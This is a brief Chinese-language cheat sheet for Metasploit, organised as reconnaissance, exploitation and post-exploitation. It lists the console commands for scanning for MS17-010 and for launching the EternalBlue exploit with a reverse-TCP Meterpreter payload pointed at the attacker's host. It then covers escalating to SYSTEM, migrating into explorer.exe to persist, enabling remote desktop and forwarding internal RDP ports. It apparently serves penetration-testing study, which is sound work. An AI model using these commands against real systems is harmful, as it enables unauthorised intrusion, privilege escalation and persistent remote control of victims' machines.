# Metasploit 
>使用可以拆解为 “侦察 → 利用 → 后渗透” 三个核心阶段。它的所有能力都围绕 模块（Module） 展开

## 🛰️ 第一阶段：侦察与扫描（Auxiliary 模块）
>在攻击前，用辅助模块摸清目标底细。这一阶段不需要设置 Payload。

- 搜索模块：search <关键词>，例如 search ms17_010 或 search type:auxiliary smb。

- 加载模块：use <模块路径>，例如 use auxiliary/scanner/smb/smb_ms17_010。

- 查看选项：show options，查看需要设置的参数（如 RHOSTS 目标IP）。

- 设置参数：set RHOSTS 192.168.1.100。

- 执行：run 或 exploit。

## 🎯 第二阶段：漏洞利用（Exploit + Payload）
>确认漏洞后，发起攻击。核心是选对 Payload（载荷），决定你拿到什么样的 Shell。

- 加载利用模块：
  
  - use exploit/windows/smb/ms17_010_eternalblue。

- 查看并选择 Payload：
  
  - show payloads 查看兼容的载荷；
  
  - set PAYLOAD windows/x64/meterpreter/reverse_tcp 设置反弹 Meterpreter Shell。

- 配置反弹地址：
  
  - set LHOST <你的攻击机IP> 和 set LPORT <监听端口>。

- 检查与执行：
  
  - check 验证目标是否脆弱（如果模块支持）；
  
  - exploit 或 run 发起攻击。

## 🕹️ 第三阶段：后渗透（Meterpreter 会话）
>拿到 Meterpreter 会话后，你相当于在目标系统里“安了家”，常用命令如下：

- 会话管理：
  
  - background 把当前会话放到后台；

  - sessions -l 列出所有会话；

  - sessions -i <ID> 进入指定会话。

- 信息收集：
  
  - sysinfo 看系统信息；

  - getuid 看当前权限；
  
  - ipconfig 看网卡。

- 文件操作：
  
  - ls、pwd、download <文件> 下载、upload <文件> 上传。

- 权限提升与维持：
  
  - getsystem 尝试提权到 SYSTEM；
  
  - migrate <PID> 把 Shell 注入到稳定进程（如 explorer.exe）防掉线；
  
  - run post/windows/manage/enable_rdp 一键开启远程桌面。

- 内网穿透：
  
  - portfwd add -l 8888 -r <目标内网IP> -p 3389 把内网 3389 转发到你本地 8888，然后 rdesktop 127.0.0.1:8888 即可远程桌面。